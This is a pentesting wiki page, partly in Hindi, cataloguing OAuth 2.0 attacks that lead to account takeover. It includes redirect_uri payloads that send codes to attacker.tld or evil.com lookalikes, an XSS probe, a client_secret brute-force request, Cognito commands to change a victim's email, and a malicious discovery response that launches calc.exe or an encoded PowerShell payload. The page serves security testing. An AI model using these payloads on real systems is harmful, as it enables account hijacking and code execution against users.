# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Basic Information <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server).

Consider a hypothetical website _**https://example.com**_, designed to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_, outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_ gains the ability to **access your posts on your behalf**.

It's essential to grasp the following components within the OAuth 2.0 framework:

- **resource owner**: आप, यानी वह **user/entity** जो अपने resource (जैसे social media account के posts) के एक्सेस को authorize करता है।
- **resource server**: वह **server जो authenticated requests को संभालता है** जब किसी application ने `access token` के जरिए resource owner की ओर से एक्सेस प्राप्त कर लिया होता है, उदाहरण के लिए **https://socialmedia.com**।
- **client application**: वह **application जो resource owner से authorization मांगती है**, जैसे **https://example.com**।
- **authorization server**: वह **server जो client application को `access tokens` जारी करता है** जब resource owner की authentication और authorization सफल हो जाती है, उदाहरण के लिए **https://socialmedia.com**।
- **client_id**: application के लिए एक सार्वजनिक, unique पहचानकर्ता।
- **client_secret:** एक confidential key, जो केवल application और authorization server के बीच ज्ञात होती है, और `access_tokens` जनरेट करने में इस्तेमाल होती है।
- **response_type**: एक मान जो बताता है **किस प्रकार का token मांगा जा रहा है**, जैसे `code`।
- **scope**: वह **access स्तर** जो client application resource owner से मांग रही है।
- **redirect_uri**: वह **URL जिस पर user authorization के बाद redirect होता है**। सामान्यतः इसे pre-registered redirect URL के साथ मैच होना चाहिए।
- **state**: एक parameter जो **user के authorization server पर जाने और लौटने के बीच डेटा बनाए रखता है**। इसकी uniqueness CSRF protection के रूप में महत्वपूर्ण होती है।
- **grant_type**: एक parameter जो बताता है **grant type और किस प्रकार का token वापस किया जाएगा**।
- **code**: authorization server द्वारा दिया गया authorization code, जिसे client application `client_id` और `client_secret` के साथ मिलाकर `access_token` प्राप्त करने के लिए उपयोग करती है।
- **access_token**: वह **token जो client application API requests के लिए resource owner की ओर से उपयोग करती है**।
- **refresh_token**: application को बिना user को पुनः प्रम्प्ट किए नया `access_token` प्राप्त करने में सक्षम बनाता है।

### Flow

The **actual OAuth flow** proceeds as follows:

1. You navigate to [https://example.com](https://example.com) and select the “Integrate with Social Media” button.
2. The site then sends a request to [https://socialmedia.com](https://socialmedia.com) asking for your authorization to let https://example.com’s application access your posts. The request is structured as:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. उसके बाद आपको एक सहमति पृष्ठ दिखाया जाता है।
4. आपकी स्वीकृति के बाद, सोशल मीडिया `redirect_uri` पर `code` और `state` पैरामीटर के साथ एक प्रतिक्रिया भेजता है:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com इस `code` को अपने `client_id` और `client_secret` के साथ उपयोग में ला कर आपकी ओर से `access_token` प्राप्त करने के लिए एक server-side अनुरोध करता है, जिससे आपने जिन अनुमतियों के लिए सहमति दी थी उन तक पहुँच संभव हो जाती है:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. अंत में, प्रक्रिया इस तरह समाप्त होती है कि https://example.com आपके `access_token` का उपयोग Social Media पर API कॉल करने के लिए करता है ताकि पहुँच प्राप्त की जा सके

## कमजोरियाँ <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server को ब्राउज़र को केवल **pre-registered, exact redirect URIs** पर ही redirect करना चाहिए। यहाँ किसी भी कमजोरी से attacker एक victim को malicious authorization URL के जरिए भेज सकता है ताकि IdP victim का `code` (और `state`) सीधे attacker के endpoint पर दे दे, जो इसे redeem कर के tokens harvest कर सकता है।

Typical attack workflow:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` and send it to the victim.
2. The victim authenticates and approves the scopes.
3. The IdP redirects to `attacker.tld/callback?code=<victim-code>&state=...` where the attacker logs the request and immediately exchanges the code.

Common validation bugs to probe:

- **No validation** – कोई absolute URL स्वीकार किया जाता है, जिससे तुरंत `code` चोरी हो सकती है।
- **Weak substring/regex checks on the host** – होस्ट पर कमजोर substring/regex चेक होने पर इसे lookalikes जैसे `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, या `match.com@evil.com` से bypass किया जा सकता है।
- **IDN homograph mismatches** – validation punycode रूप (`xn--`) पर होता है, पर browser attacker द्वारा नियंत्रित Unicode domain पर redirect करता है।
- **Arbitrary paths on an allowed host** – `redirect_uri` को `/openredirect?next=https://attacker.tld` या किसी भी XSS/user-content endpoint पर पॉइंट करने से code chained redirects, Referer headers, या injected JavaScript के जरिए लीक हो सकता है।
- **Directory constraints without normalization** – `/oauth/*` जैसे पैटर्न को `/oauth/../anything` से बायपास किया जा सकता है।
- **Wildcard subdomains** – `*.example.com` स्वीकार करने का मतलब है कि कोई भी takeover (dangling DNS, S3 bucket, आदि) तुरंत एक valid callback दे देगा।
- **Non-HTTPS callbacks** – `http://` URIs को होने देने से नेटवर्क attackers (Wi‑Fi, corporate proxy) को transit में `code` छीनने का मौका मिल जाता है।

साथ ही auxiliary redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, आदि) और OpenID discovery document (`/.well-known/openid-configuration`) की भी समीक्षा करें ताकि अतिरिक्त endpoints जिनमें वही validation बग हो सकते हैं, पता चल सकें।

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

जैसा कि इस bug bounty रिपोर्ट में बताया गया है [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), यह संभव हो सकता है कि redirect **URL सर्वर की response में परिलक्षित हो रहा हो** जब user authenticate कर लेता है, और इसलिए **XSS के लिए vulnerable** हो। परखने के लिए संभावित payload:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - state parameter का गलत प्रबंधन <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

रीप्ले पैटर्न हमेशा समान होता है:

1. Attacker अपने account से IdP पर authenticate करता है और अंतिम redirect जिसमें `code` (और कोई `state`) होता है उसे intercept कर लेता है।
2. वह उस request को drop कर देता है, URL रख लेता है, और बाद में किसी भी CSRF primitive (link, iframe, auto-submitting form) का दुरुपयोग करके victim browser को उसे load करने पर मजबूर कर देता है।
3. यदि client `state` को enforce नहीं करता, तो application attacker के authorization result को consume कर लेगी और attacker को victim के app account में logged in कर देगी।

टेस्ट के दौरान `state` हैंडलिंग के लिए एक व्यावहारिक चेकलिस्ट:

- **Missing `state` entirely** – यदि parameter कभी दिखाई ही नहीं देता, तो पूरा login CSRFable हो जाता है।
- **`state` not required** – इसे initial request से हटा दें; यदि IdP फिर भी codes जारी करता है जिन्हें client स्वीकार करता है, तो defense opt-in है।
- **Returned `state` not validated** – response में value के साथ छेड़छाड़ करें (Burp, MITM proxy). mismatched values स्वीकार करना मतलब है कि stored token की कभी तुलना नहीं की जाती।
- **Predictable or purely data-driven `state`** – कई apps redirect paths या JSON blobs को randomness मिलाए बिना `state` में भर देते हैं, जिससे attackers मान्य मानों का अनुमान लगा कर flows replay कर सकते हैं। हमेशा डेटा encode करने से पहले मजबूत entropy prepend/append करें।
- **`state` fixation** – यदि app उपयोगकर्ताओं को `state` value देने की अनुमति देता है (उदा., crafted authorization URLs के जरिए) और flow में वही value reuse करता है, तो attacker एक ज्ञात value लॉक कर सकता है और उसे कई victims पर reuse कर सकता है।

PKCE `state` की पूरक भूमिका निभा सकता है (विशेषकर public clients के लिए) द्वारा authorization code को एक code verifier से बाँधकर, पर web clients को तब भी `state` track करना चाहिए ताकि cross-user CSRF/account-linking बग रोके जा सकें।

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Attackers पूर्व में victim के email का उपयोग करके एक account बना सकते हैं। यदि बाद में victim किसी third-party सेवा का उपयोग करके login करता है, तो application अनजाने में उस third-party account को attacker के pre-created account से link कर सकती है, जिससे unauthorized access हो सकता है।
2. **Exploiting Lax OAuth Email Verification**: Attackers ऐसे OAuth सेवाओं का फायदा उठा सकते हैं जो emails verify नहीं करतीं — वे अपनी सेवा पर register कर सकते हैं और फिर account email को victim के email में बदल सकते हैं। यह तरीका भी unauthorized account access का जोखिम पैदा करता है, पहले स्थिति के समान लेकिन अलग attack vector के जरिये।

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.

एक बार attacker secret extract कर लेता है, उन्हें बस किसी victim authorization `code` (कमज़ोर `redirect_uri`, logs, आदि के जरिए) को चुराना होता है ताकि वे स्वतंत्र रूप से `/token` हिट कर के access/refresh tokens बनवाएँ बिना legitimate app को शामिल किए। public/native clients को **incapable of holding secrets** मानें—उनको स्थिर secret के बजाय per-instance code verifier के मालिक होने का प्रमाण देने के लिए PKCE (RFC 7636) पर निर्भर रहना चाहिए। टेस्टिंग के दौरान, पुष्टि करें कि PKCE अनिवार्य है या नहीं और backend वास्तव में token exchanges को reject करता है जब `client_secret` **या** मान्य `code_verifier` मौजूद न हो।

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: OAuth redirect के बाद, कोई भी navigation जो URL में `?code=&state=` रखता है, उन्हें CDNs/analytics/ads को भेजे जाने वाले **Referer** header में डाल देगा।
- **Telemetry/analytics confused deputy**: कुछ SDKs (pixels/JS loggers) `postMessage` events पर प्रतिक्रिया करते हैं और फिर **संदेश में दिए गए token का उपयोग करके current `location.href`/`referrer` को backend APIs पर भेज देते हैं**। यदि आप उस फ्लो में अपना token inject कर सकते हैं (उदा., attacker-controlled postMessage relay के जरिए), तो आप बाद में SDK की API request history/logs पढ़कर उन requests में embedded victim के OAuth artifacts recover कर सकते हैं।

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – अगर `access_token` query/fragment में दिखाई देता है, तो यह browser history, server logs, analytics, और third parties को भेजे जाने वाले Referer headers में रिकॉर्ड हो जाता है.
- **Tokens transiting untrusted middleboxes** – tokens को HTTP पर वापस भेजना या debugging/corporate proxies के जरिए भेजना network observers को उन्हें सीधे capture करने देता है.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, या serialized JSON blobs origin पर हर script (जिसमें XSS payloads या malicious extensions भी शामिल हैं) को tokens एक्सपोज़ करते हैं.
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` shared devices पर logout के बाद भी लंबे समय तक tokens retain करते हैं और script द्वारा access किए जा सकते हैं.

इनमें से कोई भी finding सामान्यतः “low” bugs (जैसे CSP bypass या DOM XSS) को full API takeover में upgrade कर देता है क्योंकि attacker बस leaked bearer token को पढ़कर replay कर सकता है।

### Everlasting Authorization Code

Authorization codes को **short-lived, single-use, और replay-aware** होना चाहिए। किसी flow का मूल्यांकन करते समय एक `code` capture करें और:

- **Test the lifetime** – RFC 6749 minutes की सिफारिश करता है, hours नहीं। 5–10 मिनट के बाद code redeem करने की कोशिश करें; अगर यह अभी भी काम करता है, तो किसी भी leaked code के लिए exposure window अत्यधिक है।
- **Test sequential reuse** – एक ही `code` दो बार भेजें। अगर दूसरी request भी कोई और token दे देती है, तो attackers session को अनिश्चित काल तक clone कर सकते हैं।
- **Test concurrent redemption/race conditions** – दो token requests parallel में भेजें (Burp intruder, turbo intruder)। कमजोर issuers कभी-कभी दोनों को grant कर देते हैं।
- **Observe replay handling** – reuse प्रयास सिर्फ fail नहीं होना चाहिए बल्कि उस code से पहले से mint किए गए किसी भी tokens को revoke भी करना चाहिए। वरना, एक detected replay attacker के पहले token को active छोड़ देता है।

replay-friendly code को किसी भी `redirect_uri` या logging bug के साथ combine करने पर victim के legitimate login पूरा करने के बाद भी persistent account access मिल सकता है।

### Authorization/Refresh Token not bound to client

यदि आप **authorization code** प्राप्त कर सकते हैं और उसे किसी अलग client/app के लिए redeem कर सकते हैं, तो आप अन्य accounts takeover कर सकते हैं। weak binding की जांच करें:

- किसी `code` को **app A** के लिए capture करके उसे **app B’s token endpoint** पर भेजना; अगर आप फिर भी token प्राप्त करते हैं तो audience binding broken है।
- ऐसे first-party token minting endpoints आजमाना जो अपने client IDs तक restricted होने चाहिएं; अगर वे केवल code validate करते हुए arbitrary `state`/`app_id` accept करते हैं, तो आप प्रभावी रूप से एक **authorization-code swap** कर के higher-privileged first-party tokens mint कर सकते हैं।
- जांचें कि client binding nonce/redirect URI mismatches को ignore करता है या नहीं। अगर error page फिर भी ऐसे SDKs लोड करता है जो `location.href` log करते हैं, तो Referer/telemetry leaks के साथ मिलाकर codes चोरी करके उन्हें कहीं और redeem किया जा सकता है।

कोई भी endpoint जो `code` → token एक्सचेंज करता है उसे issuing client, redirect URI, और nonce verify करना **जरूरी** है; वरना किसी भी app से चोरी किया गया code first-party access token में upgrade हो सकता है।

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### अन्य Apps के tokens का दुरुपयोग <a href="#bda5" id="bda5"></a>

जैसा कि [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts) में बताया गया है, OAuth flows जो **token** (और code नहीं) प्राप्त करने की उम्मीद रखते हैं, वे प्रवण हो सकते हैं अगर वे यह नहीं जाँचते कि token उनके app का है।

क्योंकि एक **हमलावर** अपनी application में **OAuth support करके और Facebook से login** करने वाला application बना सकता है (उदाहरण के लिए)। फिर, जब कोई पीड़ित Facebook से उसी **हमलावर की application** में login करता है, तो हमलावर उस user को दिए गए **OAuth token** को प्राप्त कर सकता है और उसे victim OAuth application में victim के user token का उपयोग करके login करने के लिए इस्तेमाल कर सकता है।

> [!CAUTION]
> इसलिए, अगर हमलावर किसी user को उसकी अपनी OAuth application तक पहुँचाने में सफल हो जाता है, तो वह उन applications में victim का account takeover कर पाएगा जो **token** की उम्मीद करते हैं और यह नहीं जाँचते कि token उनके app ID को ग्रांट किया गया था या नहीं।

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), यह संभव था कि पीड़ित को एक पेज खोलवाया जाए जिसका **returnUrl** हमलावर के host की ओर इशारा कर रहा हो। यह जानकारी **cookie (RU)** में **store** हो जाती थी और एक **बाद के कदम** में **prompt** user से पूछता था कि क्या वह उस हमलावर के host को access देना चाहता है।

इस prompt को bypass करने के लिए, यह संभव था कि एक tab खोला जाए जो **Oauth flow** initiate करे और यह RU cookie को **returnUrl** के उपयोग से सेट करे, फिर prompt दिखने से पहले उस tab को close कर दिया जाए, और एक नया tab बिना उस value के खोला जाए। तब **prompt हमलावर के host के बारे में सूचना नहीं देगा**, लेकिन cookie उसी पर सेट हो चुकी होगी, इसलिए redirection में **token हमलावर के host को भेज दिया जाएगा**।

### Prompt इंटरैक्शन बायपास <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), कुछ OAuth implementations में GET parameter **`prompt`** को None (**`&prompt=none`**) के रूप में दर्शाया जा सकता है ताकि अगर user पहले से प्लेटफ़ॉर्म पर logged in है तो वे वेब पर confirmation के लिए prompt न दिखे।

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), यह संभव हो सकता है कि parameter **`response_mode`** दिया जाए ताकि final URL में code किस तरह प्रदान किया जाए यह बताया जा सके:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs ideal clickjacking targets होते हैं: अगर उन्हें frame किया जा सकता है, तो एक हमलावर कस्टम graphics overlay कर सकता है, असली बटन छुपा सकता है, और उपयोगकर्ताओं को खतरनाक scopes approve करने या accounts link करने के लिए trick कर सकता है। PoC बनाते समय:

1. IdP authorization URL को `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` के अंदर load करें।
2. fake buttons को hidden **Allow**/**Approve** controls के साथ align करने के लिए absolute positioning/opacity tricks का उपयोग करें।
3. वैकल्पिक रूप से parameters (scopes, redirect URI) को pre-fill करें ताकि stolen approval तुरंत हमलावर को लाभ दे।

टेस्ट करते समय verify करें कि IdP पेज या तो `X-Frame-Options: DENY/SAMEORIGIN` emit करते हैं या एक restrictive `Content-Security-Policy: frame-ancestors 'none'` है। यदि कोई भी मौजूद नहीं है, तो [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) जैसे tooling से risk demonstrate करें और रिकॉर्ड करें कि कितना आसानी से कोई victim हमलावर की app authorize कर देता है। अतिरिक्त payload ideas के लिए देखें [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), यह एक OAuth flow है जो **username** और **password** के माध्यम से OAuth में login करने की अनुमति देता है। अगर इस सरल flow के दौरान user के द्वारा किए जा सकने वाले सभी actions तक access देने वाला एक **token** लौटता है, तो उस token का उपयोग करके 2FA bypass करना संभव हो सकता है।

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) बताता है कि कैसे एक **open redirect** को **referrer** की value पर आधारित करके OAuth के माध्यम से ATO का दुरुपयोग किया जा सकता है। हमला इस तरह था:

1. Victim हमलावर की web page पर जाता है
2. Victim malicious link खोलता है और एक opener Google OAuth flow start करता है जिसमें अतिरिक्त parameters के रूप में `response_type=id_token,code&prompt=none` दिए गए होते हैं और **referrer** के रूप में हमलावर की website का उपयोग होता है।
3. Opener में, provider जब victim को authorize कर देता है, तो यह उन्हें `redirect_uri` parameter (victim web) की value पर 30X code के साथ वापस भेजता है जो अभी भी referer में हमलावर की website को रखता है।
4. Victim की **website referrer** के आधार पर open redirect trigger करती है और victim user को हमलावर की website पर redirect कर देती है; क्योंकि **`respose_type`** **`id_token,code`** था, code URL के **fragment** में attacker को भेज दिया जाएगा और इससे वह victim के account को Google के जरिए victims site पर takeover कर लेगा।

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth एक कम स्पष्ट परंतु महत्वपूर्ण vector है जो security vulnerabilities, विशेषकर **SSRF** attacks के लिए जोखिम पैदा करता है। यह endpoint OAuth servers को client applications के बारे में details भेजने की अनुमति देता है, जिनमें sensitive URLs शामिल हो सकती हैं जो exploit की जा सकती हैं।

Key Points:

- **Dynamic Client Registration** अक्सर `/register` से map होता है और POST requests के माध्यम से `client_name`, `client_secret`, `redirect_uris`, और logos या JSON Web Key Sets (JWKs) के लिए URLs स्वीकार करता है।
- यह feature **RFC7591** और **OpenID Connect Registration 1.0** में बताए गए specifications का पालन करता है, जिनमें ऐसे parameters शामिल हैं जो SSRF के लिए vulnerable हो सकते हैं।
- Registration प्रक्रिया अनजाने में servers को SSRF के लिए उजागर कर सकती है कई तरीकों से:
  - **`logo_uri`**: client application का logo URL जो server द्वारा fetch किया जा सकता है, जिससे SSRF या URL के mishandling से XSS हो सकता है।
  - **`jwks_uri`**: client के JWK document का URL, जिसे malicious तरीके से बनाकर server को attacker-controlled server पर outbound requests करने पर मजबूर किया जा सकता है।
  - **`sector_identifier_uri`**: `redirect_uris` की JSON array को reference करता है, जिसे server fetch कर सकता है और SSRF का मौका पैदा कर सकता है।
  - **`request_uris`**: client के लिए allowed request URIs की list, जिसे authorization process के शुरू में server द्वारा fetch किया जाना exploit के लिए उपयोगी हो सकता है।

Exploitation Strategy:

- SSRF को trigger करने के लिए नया client register करें और parameters जैसे `logo_uri`, `jwks_uri`, या `sector_identifier_uri` में malicious URLs प्रदान करें।
- जबकि `request_uris` के माध्यम से प्रत्यक्ष exploitation whitelist controls से mitigate किया जा सकता है, एक pre-registered, attacker-controlled `request_uri` देना authorization phase के दौरान SSRF की सुविधा दे सकता है।

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) दिखाता है कि कैसे **dynamic OAuth discovery एक RCE primitive बन सकती है** जब client IdP metadata को सीधे operating system को forward करता है। remote MCP server discovery exchange (`/.well-known/openid-configuration` या कोई भी metadata RPC) के दौरान एक attacker-controlled `authorization_endpoint` लौटाता है। `mcp-remote ≤0.1.15` तब system URL handler (`start`, `open`, `xdg-open`, आदि) को उस string के साथ call कर देता था जो आया था, इसलिए OS द्वारा supported किसी भी scheme/path को locally execute किया जा सकता था।

Attack workflow

1. Desktop agent को hostile MCP/OAuth server की ओर इंगित करें (`npx mcp-remote https://evil`). Agent `401` के साथ metadata प्राप्त करता है।
2. Server ऐसा JSON reply करता है:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. क्लाइंट प्रदान किए गए URI के लिए OS handler लॉन्च करता है। Windows ऐसे payload स्वीकार करता है जैसे `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux `file:///Applications/Calculator.app/...` स्वीकार करते हैं या यहां तक कि रजिस्टर्ड होने पर कस्टम स्कीम जैसे `cmd://bash -lc '<payload>'` भी स्वीकार कर लेते हैं।
4. क्योंकि यह किसी भी उपयोगकर्ता इंटरैक्शन से पहले होता है, **केवल क्लाइंट को attacker सर्वर से बात करने के लिए कॉन्फ़िगर करना ही code execution दे देता है**।

**परीक्षण कैसे करें**

- लक्षित करें किसी भी OAuth-capable desktop/agent को जो HTTP(S) पर discovery करता है और लौटे हुए endpoints को लोकल रूप से खोलता है (Electron apps, CLI helpers, thick clients).
- discovery response को intercept या host करें और `authorization_endpoint`, `device_authorization_endpoint`, या समान fields को `file://`, `cmd://`, UNC paths, या अन्य dangerous schemes से बदल दें।
- देखें कि क्लाइंट scheme/host को validate करता है या नहीं। वैलिडेशन की कमी user context में तात्कालिक execution का परिणाम देती है और समस्या को प्रमाणित करती है।
- विभिन्न schemes के साथ दोहराएँ ताकि पूरा attack surface मैप हो (उदा., `ms-excel:`, `data:text/html,`, custom protocol handlers) और cross-platform पहुँच दिखाएँ।

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- कुछ Authorization Servers यह सुनिश्चित नहीं करते कि ये properties (जैसे email) immutable रहें।
- कुछ implementations—जैसे **"Login with Microsoft"**—क्लाइंट email field पर निर्भर करता है, जो **user-controlled by the user in Entra ID** होता है और verified नहीं होता।
- एक attacker इसका शोषण करके अपनी खुद की Azure AD organization बना सकता है (उदा., doyensectestorg) और इसका उपयोग Microsoft login करने के लिए कर सकता है।
- हालाँकि Object ID (जो sub में store होता है) immutable और secure है, mutable email field पर निर्भरता account takeover सक्षम कर सकती है (उदा., victim@gmail.com जैसे account का hijacking)।

## Client Confusion Attack

In a **Client Confusion Attack**, एक application जो OAuth Implicit Flow उपयोग करती है, यह verify करने में विफल रहती है कि अंतिम access token विशेष रूप से उसके अपने Client ID के लिए बनाया गया है या नहीं। एक attacker एक public website सेट अप करता है जो Google’s OAuth Implicit Flow उपयोग करता है, हजारों उपयोगकर्ताओं को लॉगिन करवा कर attacker की साइट के लिए उत्पन्न access tokens को harvest कर लेता है। अगर इन उपयोगकर्ताओं के accounts किसी अन्य vulnerable वेबसाइट पर भी हैं जो token के Client ID को validate नहीं करती, तो attacker harvested tokens को reuse कर पीड़ितों का impersonate कर सकता है और उनके accounts takeover कर सकता है।

## Scope Upgrade Attack

The **Authorization Code Grant** प्रकार उपयोगकर्ता डेटा भेजने के लिए secure server-to-server communication शामिल करता है। हालांकि, अगर **Authorization Server** Access Token Request में scope parameter (जो RFC में परिभाषित नहीं है) पर implicitly भरोसा करता है, तो एक malicious application higher scope का अनुरोध कर authorization code के privileges को upgrade कर सकता है। जब **Access Token** उत्पन्न हो जाता है, तो **Resource Server** को इसे verify करना चाहिए: JWT tokens के लिए, इसमें JWT signature की जाँच और client_id व scope जैसे डेटा का extraction शामिल है, जबकि random string tokens के लिए server को Authorization Server से token के details की query करनी चाहिए।

## Redirect Scheme Hijacking

मोबाइल OAuth implementations में, apps Authorization Codes के साथ redirects प्राप्त करने के लिए **custom URI schemes** का उपयोग करते हैं। हालांकि, क्योंकि एक ही scheme को device पर multiple apps रजिस्टर कर सकते हैं, यह मानना कि केवल legitimate client ही redirect URI को नियंत्रित करता है, गलत हो जाता है। उदाहरण के लिए Android पर, एक Intent URI जैसे `com.example.app://` oauth scheme और app के intent-filter में परिभाषित वैकल्पिक filters के आधार पर पकड़ा जाता है। चूंकि Android की intent resolution व्यापक हो सकती है—खासकर जब केवल scheme निर्दिष्ट किया गया हो—एक attacker एक malicious app रजिस्टर कर सकता है जिसमें सावधानीपूर्वक तैयार किया गया intent filter हो ताकि वह authorization code को hijack कर ले। यह **enable an account takeover** कर सकता है या तो user interaction के माध्यम से (जब multiple apps intent संभालने के लिए योग्य हों) या bypass techniques के जरिए जो overly specific filters का शोषण करती हैं, जैसा कि Ostorlab के assessment flowchart में विस्तृत है।

## संदर्भ

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
